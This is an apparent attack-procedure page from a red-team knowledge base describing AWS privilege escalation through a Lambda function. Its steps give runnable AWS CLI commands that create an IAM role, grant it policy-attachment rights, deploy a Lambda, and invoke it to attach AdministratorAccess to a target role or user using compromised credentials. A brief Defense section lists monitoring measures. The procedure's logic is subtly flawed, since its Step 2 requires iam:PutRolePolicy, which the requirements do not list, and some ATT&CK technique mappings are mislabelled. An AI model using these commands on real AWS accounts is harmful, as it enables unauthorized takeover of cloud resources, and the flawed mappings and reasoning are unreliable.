---
id: 03578124-672d-4482-b2c5-ddfa02fc6b7e
name: AWS-Lambda-Function-Privilege-Escalation-via-IAM-Policy-Attachment
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:12.007768+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Access-Token-Manipulation|T1134 - Access Token Manipulation]]'
  - >-
    [[techniques/Cloud-Service-Discovery|T1589 - Cloud Infrastructure
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/Cloud - AWS]]'
  - '[[tags/Lambda-Function]]'
  - '[[tags/IAM-Policy-Attachment]]'
  - '[[tags/Privilege-Escalation]]'
commands:
  - '[[commands/aws-iam-create-role]]'
  - '[[commands/aws-lambda-create-function]]'
  - '[[commands/aws-lambda-update-function-code]]'
  - '[[commands/aws-lambda-invoke-function]]'
platforms:
  - AWS
tools:
  - '[[tools/AWS-CLI]]'
validated: true
---

# AWS-Lambda-Function-Privilege-Escalation-via-IAM-Policy-Attachment

## Summary

This procedure demonstrates how to escalate privileges in an AWS environment by creating a Lambda function attached to a custom IAM role with sufficient permissions to attach elevated IAM policies to other roles or users. The Lambda function executes code that attaches a high-privilege policy, allowing the attacker to gain broader access to AWS resources such as S3 buckets or EC2 instances.

## Description

In this privilege escalation technique, an attacker with limited IAM permissions (e.g., ability to create Lambda functions and IAM roles) creates a new IAM role for a Lambda function, grants it permissions to attach policies, and deploys a Python handler script within the Lambda. When invoked, the Lambda attaches a target IAM policy to a specified role or user, effectively escalating privileges. This bypasses direct policy attachment restrictions by leveraging Lambda's execution context. The target environment is AWS, assuming the attacker has console or CLI access with lambda:CreateFunction and iam:CreateRole permissions. Success enables actions like data exfiltration or further lateral movement. Detection relies on CloudTrail monitoring for unusual Lambda invocations and IAM changes.

## Requirements

1. AWS credentials with permissions for iam:CreateRole, iam:AttachRolePolicy (for the Lambda role), lambda:CreateFunction, and lambda:InvokeFunction.
2. AWS CLI installed and configured with the compromised credentials.
3. Access to a Python environment to prepare the Lambda code (boto3 library).
4. Target IAM policy ARN that grants elevated privileges (e.g., AdministratorAccess).

## Defense

- Enforce least privilege by restricting lambda:CreateFunction and iam:CreateRole to trusted principals.
- Monitor CloudTrail for Lambda function creations, invocations, and IAM policy attachments from unexpected sources.
- Use AWS Config rules to alert on roles with excessive permissions attached via Lambda.
- Enable GuardDuty for detection of anomalous IAM and Lambda activities.

## Objectives

1. Create a Lambda function capable of attaching IAM policies.
2. Escalate privileges by attaching high-privilege policies to target IAM entities.
3. Gain access to sensitive AWS resources for further exploitation.

## Instructions

### Step 1: Create IAM Role for Lambda Function

**Context**: Create a custom IAM role that the Lambda function will assume, granting it permissions to attach policies to other roles or users. This role needs iam:AttachRolePolicy and iam:AttachUserPolicy permissions.

**Command** ([[commands/aws-iam-create-role]]):
```bash
aws iam create-role --role-name LambdaEscalationRole --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
```

> This command creates the role. Expected output includes the role ARN. Verify with aws iam get-role --role-name LambdaEscalationRole.

### Step 2: Attach Necessary Policies to the Lambda Role

**Context**: Attach a policy to the Lambda role allowing it to manage IAM attachments. Use a custom policy JSON allowing iam:AttachRolePolicy and iam:AttachUserPolicy.

**Command** ([[commands/aws-iam-put-role-policy]]):
```bash
aws iam put-role-policy --role-name LambdaEscalationRole --policy-name EscalationPolicy --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["iam:AttachRolePolicy","iam:AttachUserPolicy"],"Resource":"*"}]}'
```

> This attaches an inline policy. Expected output is a success message with no errors. The role now has the required permissions for escalation.

### Step 3: Create the Lambda Function

**Context**: Deploy the Lambda function using the created role. This sets up the execution environment for the policy attachment code.

**Command** ([[commands/aws-lambda-create-function]]):
```bash
aws lambda create-function --function-name EscalationLambda --runtime python3.9 --role arn:aws:iam::ACCOUNT_ID:role/LambdaEscalationRole --handler lambda_function.handler --zip-file fileb://function.zip
```

> Prepare function.zip with the code file named lambda_function.py containing the handler. Expected output includes the function ARN and configuration. Replace ACCOUNT_ID with your AWS account ID.

### Step 4: Update Lambda Function Code with Escalation Script

**Context**: Upload the Python code snippet that performs the IAM policy attachment when the Lambda is invoked.

**Code** ([[codes/AWS-Lambda-IAM-Policy-Attachment-Handler]]):

> Embed the code in lambda_function.py and zip it. Then use the command below to update.

**Command** ([[commands/aws-lambda-update-function-code]]):
```bash
aws lambda update-function-code --function-name EscalationLambda --zip-file fileb://updated_function.zip
```

> Expected output confirms the code update. The Lambda is now ready to execute the attachment logic.

### Step 5: Invoke the Lambda Function to Attach Policy

**Context**: Trigger the Lambda to execute the handler, specifying the target role/user and policy ARN in the event payload. This performs the actual escalation.

**Command** ([[commands/aws-lambda-invoke-function]]):
```bash
aws lambda invoke --function-name EscalationLambda --payload '{"role_name": "TargetRole", "policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess", "user_name": "TargetUser"}' response.json
```

> Customize the payload with actual names/ARNs. Expected output in response.json: {"statusCode": 200, "body": "\"IAM Policy Attached Successfully\""}. Check IAM console for attached policy confirmation.

**Success Indicators**:
- Lambda invocation returns 200 status.
- Target role/user shows the elevated policy attached in AWS console.
- No permission denied errors in CloudTrail logs.
